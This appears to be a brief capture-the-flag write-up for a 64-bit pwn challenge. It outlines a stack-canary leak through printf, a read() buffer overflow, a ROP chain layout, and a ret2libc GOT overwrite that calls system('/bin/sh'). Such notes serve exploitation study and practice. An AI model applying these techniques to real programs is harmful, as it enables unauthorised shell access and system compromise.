**Read source code**
- `printf("Buf: %s\n", buf);`: leak canary
- `read(0, buf, 0x100);`: bufferoverflow => ROP
- Stack
```
buf (rbp - 0x40)
canary (rbp-0x8)
rdi -> 1
rsi -> read_got
r15 -> 0
write_plt
---
rdi -> 0
rsi -> read_got
r15 -> 0
read_plt
---
rdi -> read_got+8
ret
read_plt
```
- `Checksec` in gdb
```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
- So the idea is that use gadget to change the execution flow of a program without injecting new code.
- Then overwrite GOT of `read` with `system` and `/bin/sh`
---  
***EPLOIT***
```
write(1, read_got,)
read(0, read_got,)
read(read_got + 0x8)
```
- Get address of read_got by `write(1, read_got,)`
- Calculate `libc_base = read - read_offset`
- Calculate `system = libc_base + system_offset`
- Overwrite address of `read_got` with `system + binsh` by using `read(0, read_got,)`
- Call `system("/bin/sh")` by `read(read_got + 0x8)`
  + `read_got + 0x8` is `/bin/sh`
